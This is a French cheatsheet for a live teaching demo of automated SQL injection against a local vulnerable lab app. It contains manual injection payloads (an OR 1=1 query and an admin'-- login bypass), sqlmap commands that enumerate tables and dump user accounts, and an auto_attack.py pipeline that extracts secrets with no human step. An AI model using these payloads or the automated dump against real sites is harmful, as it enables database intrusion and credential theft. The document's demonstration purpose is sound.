# Cheatsheet pratique — démo sqlmap en direct

## -1. Démo "manuel vs automatisé" (à lancer en tout premier, en direct)

```bash
./demo_manuel_vs_auto.sh
```

Ce script interactif (appuie sur Entrée entre chaque étape) montre, dans l'ordre :
1. Deviner le nombre de colonnes à la main (ORDER BY 1, 2, 3... une requête à la fois)
2. Extraire UN SEUL caractère du mot de passe admin lettre par lettre (boolean-blind manuel) — montre qu'il faut des dizaines d'essais pour un seul caractère, sur 16
3. Le time-based blind mesuré en vrai avec `time curl` — différence typique **~0.02s vs ~2s**, qui prouve l'injection sans rien voir
4. Puis lance `auto_attack.py` et chronomètre le tout : **~30 secondes pour tout extraire automatiquement** (mot de passe, flag, dump complet)

C'est l'argument le plus parlant pour "pourquoi automatiser" : le contraste est direct et mesuré en live, pas juste affirmé.

## 0. LE clou de la démo : pipeline 100% automatisé

C'est le point central de l'exposé ("automatisation de l'attaque SQL") : au lieu
d'enchaîner les commandes sqlmap une par une à la main, `auto_attack.py` orchestre
tout — détection, fingerprint, énumération des tables, dump complet, recherche
automatique de flag/secrets dans les données, et génération d'un rapport Markdown
— **en une seule commande, sans aucune intervention humaine entre les étapes** :

```bash
python3 auto_attack.py "http://127.0.0.1:5500/product?id=1"
```

Sortie typique (capture réelle) :
```
[1/4] Detection + fingerprint...
  -> DBMS: SQLite
  -> Techniques confirmees: 2
     - SQLite > 2.0 AND time-based blind (heavy query)
     - Generic UNION query (NULL) - 1 to 20 columns

[2/4] Enumeration des tables...
  -> 4 table(s) trouvee(s): products, secret_notes, sqlite_sequence, users

[3/4] Dump complet de toutes les tables...

[4/4] Analyse automatique du dump (recherche de flags / donnees sensibles)...
  -> 1 flag(s) detecte(s) automatiquement :
     *** CTF{DEMO_FLAG_FOUND_VIA_AUTOMATED_SQLI} ***
  -> 4 valeur(s) sensible(s) (colonnes password/secret/token...) détectées

TERMINE. Rapport : sqlmap-output/auto-<timestamp>/report.md
```

Le rapport (`report.md` + `report.json`) est généré automatiquement et prêt à montrer
à l'écran : cible, techniques confirmées, tables trouvées, données sensibles extraites,
flags détectés. **C'est cette automatisation de bout en bout — pas juste "sqlmap tout seul" —
qui répond directement au sujet de l'exposé.**

## 1. Démarrer le labo (si besoin de relancer de zéro)

```bash
cd sqli-lab
python3 seed_db.py      # (re)crée la base avec des données fraîches
python3 app.py           # lance le serveur sur http://127.0.0.1:5500
```

Routes disponibles :
- `/product?id=1` — injection dans un paramètre GET numérique (la plus facile à démontrer)
- `/search?q=clavier` — injection dans un LIKE
- `/login` — formulaire POST vulnérable à un bypass d'authentification

## 2. Montrer l'injection "à la main" d'abord (pédagogique)

```bash
# Récupérer TOUS les produits au lieu d'un seul (condition toujours vraie)
curl "http://127.0.0.1:5500/product?id=1%20OR%201=1"

# Bypass d'authentification classique
curl -X POST http://127.0.0.1:5500/login \
  --data-urlencode "username=admin'--" \
  --data-urlencode "password=nimportequoi"
```

## 3. Lancer sqlmap — détection

```bash
sqlmap -u "http://127.0.0.1:5500/product?id=1" --batch --level=3 --risk=2 --banner
```
→ Montre les 3 techniques détectées automatiquement (boolean-blind, time-blind, UNION) + la version SQLite.

## 4. Énumérer les tables

```bash
sqlmap -u "http://127.0.0.1:5500/product?id=1" --batch --tables
```

## 5. Dump complet

```bash
sqlmap -u "http://127.0.0.1:5500/product?id=1" --batch -T users,secret_notes --dump
```
→ Récupère les comptes utilisateurs ET le flag caché dans `secret_notes`.

## 6. sqlmap sur un formulaire POST (login)

```bash
cat > login_req.txt << 'EOF'
POST /login HTTP/1.1
Host: 127.0.0.1:5500
Content-Type: application/x-www-form-urlencoded

username=admin&password=test
EOF

sqlmap -r login_req.txt --batch -p username --dump -T users
```

## Astuces pour la présentation

- Toujours montrer la requête SQL générée avant/après (affichée directement dans les pages du labo, en `<code>`) — ça rend visible ce que sqlmap exploite réellement.
- `--batch` répond "oui" à toutes les questions interactives de sqlmap automatiquement — indispensable pour une démo fluide sans interruption.
- Si le temps presse : saute l'étape 2 (bypass manuel) et enchaîne direct détection → dump, c'est le plus impressionnant visuellement.
- Garde `sqlmap-output/` pour pouvoir rejouer une session sans tout refaire (`--resume` implicite via le dossier de session).

## Rappel éthique à dire à l'oral

Ce labo tourne en local (127.0.0.1), créé spécifiquement pour cette démo. Ne jamais lancer sqlmap contre un site qu'on ne possède pas ou pour lequel on n'a pas d'autorisation écrite — c'est une infraction pénale (article 323-1 et suivants du Code pénal en France, par exemple).
